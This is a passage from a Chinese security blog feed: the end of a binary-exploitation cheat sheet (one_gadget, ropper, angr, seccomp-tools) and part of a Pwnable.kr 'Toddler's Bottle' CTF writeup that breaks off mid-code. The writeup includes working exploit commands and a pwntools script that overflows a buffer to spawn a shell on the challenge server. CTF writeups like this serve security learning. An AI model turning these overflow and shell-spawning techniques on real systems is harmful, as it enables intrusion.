instructions console printing</span><br><span class="line">    --dump               Outputs the gadget bytes</span><br><span class="line">    --silent             Disables printing of gadgets during analysis</span><br><span class="line">    --align ALIGN        Align gadgets addresses (in bytes)</span><br><span class="line">    --mipsrop &lt;rtype&gt;    MIPS useful gadgets finder</span><br><span class="line">                         stackfinder|system|tails|lia0|registers</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/11.png"></p><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>检查一个 libc 中是否有 one gadget。所谓 one gadget 指的是通过一个 gadget，满足某种约束（例如寄存器中某个值）即可直接 getshell。安装 one_gadget 如下。前文中的 dockerfile 集成了 one_gadget。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/12.png"></p><p>以上图第 2 个 one gadget 为例，若可以满足 rsp+0x40 为 0，则直接跳转到 libc 中的 0x4f3c2 偏移就可以调用 execve 来 get shell。需要注意的是使用 one gadget 必须要先知道 libc 的基址。</p><h2 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h2><p>类似 ropgadget 的工具，但是输出更好看一点，找到的 gadgets 貌似也更多一点，安装如下。前文中的 dockerfile 集成了 ropper。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ropper</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/13.png"></p><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><p>angr 是一个 python 库，主要用来求解多种约束下的某一条程序路径所对应的输入。angr 的安装如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过 angr 非常大，所以一般推荐使用 angr 的 docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install docker</span></span><br><span class="line"><span class="comment"># curl -sSL https://get.docker.com/ | sudo sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pull the docker image</span></span><br><span class="line">sudo docker pull angr/angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># run it</span></span><br><span class="line">sudo docker run -it angr</span><br></pre></td></tr></table></figure><p>angr 主要是为了逆向而生，比如某程序有如下约束条件才可以继续执行。该程序来自 angr 官方示例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">authenticate</span><span class="params">(<span class="type">char</span> *username, <span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> stored_pw[<span class="number">9</span>];</span><br><span class="line">    stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pwfile;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// evil back d00r</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pwfile = open(username, O_RDONLY);</span><br><span class="line">    read(pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">accepted</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the admin console, trusted user!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rejected</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> username[<span class="number">9</span>];</span><br><span class="line">    <span class="type">char</span> password[<span class="number">9</span>];</span><br><span class="line">    <span class="type">int</span> authed;</span><br><span class="line"></span><br><span class="line">    username[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: \n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, username, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: \n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    authed = authenticate(username, password);</span><br><span class="line">    <span class="keyword">if</span> (authed) accepted();</span><br><span class="line">    <span class="keyword">else</span> rejected();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序要求我们输入一个正确的用户名和密码，通过手工逆向是可以很容易找到的，但是利用 angr 的脚本如下，其中 fauxware 是程序名，最后打印出了所有可能的通过检查的路径分支所对应的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">basic_symbolic_execution</span>():</span><br><span class="line">    p = angr.Project(<span class="string">&#x27;fauxware&#x27;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    path = p.factory.path(state)</span><br><span class="line"></span><br><span class="line">    pathgroup = p.factory.path_group(path)</span><br><span class="line">    pathgroup.step(until=<span class="keyword">lambda</span> lpg: <span class="built_in">len</span>(lpg.active) &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pathgroup.active)):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;possible %d: &quot;</span> % i, pathgroup.active[i].state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> basic_symbolic_execution()</span><br></pre></td></tr></table></figure><p>假设有如下存在栈溢出的程序，但是首先需要我们输入一个密码才可以进入触发栈溢出的函数。为了简化难度，直接假设密码比较简单，但是实际情况下手工逆向出密码非常复杂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main(void)&#123;</span><br><span class="line">    char buf[<span class="number">20</span>]</span><br><span class="line">    char name[<span class="number">9</span>];</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp(name,<span class="string">&quot;jsk&quot;</span>))&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printf(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求解这类问题的 angr 脚本如下。其中 pwn 为二进制程序名，find 参数为成功的路径的地址，对应到程序中就是 main 中调用 read 的地址，avoid 参数为失败的路径的地址，对应到程序中就是 main 中调用 printf 的地址，最后打印出找到的可以到达成功路径地址的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = angr.Project(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=<span class="number">0x0804939D</span>, avoid=<span class="number">0x080493B1</span>)</span><br><span class="line">    <span class="built_in">print</span>(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>一个真实的 ctf 示例如下，首先要求我们输入一个 key，通过一系列检查这个函数才会返回 1，表示输入了正确的 key，才可能会触发后续的漏洞利用，在这种场景下 angr 是最合适的。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/15.png"></p><h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><p>检查程序开启的 seccomp 沙箱策略。安装如下。前文中的 dockerfile 集成了 seccomp-tools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><p>如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/14.png"></p><p>以上图为例，只允许的系统调用为 re_sigreturn，sigreturn，exit_group，exit，open，read，write。需要注意的是要是用该工具检查 elf 的沙箱策略，该工具必须先运行一遍 elf 文件。</p>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.KR Writeup of Toddler&#39;s Bottle</title>
      <link href="/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/"/>
      <url>/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Challenges in <a href="https://pwnable.kr/">Pwnable.kr</a></p></blockquote><h1 id="fd-1-pt"><a href="#fd-1-pt" class="headerlink" title="fd (1 pt)"></a>fd (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = atoi(argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以控制的是 argv[1]，最终的目标是 <code>read(fd, buf, 32)</code> 之后的 buf 中的字符串为<code>LETMEWIN\n</code>，所以我们可以将 fd 控制为从标准输入中读取，即 fd 为 0，则需要满足<code>atoi(argv[1] ) == 0x1234</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;LETMEWIN&#x27;)&quot;</span>|./fd `python -c <span class="string">&quot;print(0x1234)&quot;</span>`</span><br></pre></td></tr></table></figure><p>首先 <code>python -c &quot;print(&#39;LETMEWIN&#39;)&quot;</code> 试 fd 程序可以从标准输入中读取 <code>LETMEWIN\n</code> 字符串，<code>python -c &quot;print(0x1234)&quot;</code>则可以将 0x1234 通过 argv 传递给 fd。</p><h1 id="collision-3-pt"><a href="#collision-3-pt" class="headerlink" title="collision (3 pt)"></a>collision (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">    <span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是通过 argv 传递一个参数，但是需要通过 <code>check_passcode</code> 函数的检查，而且必须为 20 个字节，最后需要 <code>check_passcode</code> 返回值为<code>0x21dd09ec</code>。</p><p>首先 <code>check_passcode</code> 函数将输入的 char* 转为 int*，由于这是一个 32 位的程序，这样在这个 int* 的数组中一共有 5 个 int，32 位程序中每一个 int 占 4 个字节，将这五个 int 加起来就是这个函数的返回值。假如我们输入的 passcode 中前 4 个字符为<code>aaaa</code>，那么在内存中就是<code>\x61\x61\x61\x61</code>，转换为 int 就变成了<code>0x61616161</code>，所以我们的目的就是让这 5 组字符串的和为<code>0x21dd09ec</code>。需要注意的一点是大小端排序的问题，例如输入的是<code>0x01020304</code>，那么在内存中就变成了<code>0x04030201</code>。</p><p>其实满足条件的字符串有很多，其中的一种为<code>0x01010101+0x01010101+0x01010101+0x11314141+0xda8c5a8 == 0x21dd09ec</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c <span class="string">&quot;print(&#x27;\x01\x01\x01\x01&#x27;*3+&#x27;\x41\x41\x31\x11&#x27;+&#x27;\xa8\xc5\xa8\x0d&#x27;)&quot;</span>`</span><br></pre></td></tr></table></figure><h1 id="bof-5-pt"><a href="#bof-5-pt" class="headerlink" title="bof (5 pt)"></a>bof (5 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    gets(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个很简单的栈溢出，溢出的目标就是将栈上的局部变量 key 的值改为<code>0xcafebabe</code>，之后就白送一个 shell。习惯性先用 checksec 检查一下，该开的都开了。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/1.png"></p><p>看一下 key 的位置在哪，算出来从 eax 到 key 的距离为 52 个字节，直接填充 52 个字节的垃圾数据然后修改 key。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/2.png"></p><p>最终的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line">conn.sendline(pg.get(<span class="number">52</span>) + p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="flag-7-pt"><a href="#flag-7-pt" class="headerlink" title="flag (7 pt)"></a>flag (7 pt)</h1><p>这是一个逆向题，只给了一个二进制文件，先用 file 看一下，发现是 64 位程序，直接用 ida64 打开。函数非常非常多，先打开 strings 窗口看看有哪些字符串，首先看到的就是 upx，这个程序很可能用 upx 加过壳，先用 upx 脱壳拿到真正的程序。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/3.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/4.png"></p><p>脱了壳以后就可以看到源程序了，直接 IDA 一把梭。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/5.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/6.png"></p><h1 id="passcode-10-pt"><a href="#passcode-10-pt" class="headerlink" title="passcode (10 pt)"></a>passcode (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> passcode1;</span><br><span class="line">    <span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span 